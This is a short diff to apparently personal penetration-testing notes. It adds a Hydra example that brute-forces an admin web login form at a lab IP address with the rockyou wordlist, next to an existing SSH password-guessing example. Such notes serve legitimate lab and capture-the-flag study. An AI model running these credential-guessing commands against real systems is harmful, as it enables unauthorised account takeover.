@@ -68,6 +68,9 @@ https://cheatography.com/itnetsec/cheat-sheets/aircrack-ng-suite/
 ### Syntax  
 `hydra -options path`  
 
+**Example**
+`hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.46.127 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:Username or password invalid" -V`
+
 ### Examples:  
 Guess SSH credentials using a given username and a list of passwords:  
 `hydra -l username -P path/to/wordlist.txt host_ip ssh`
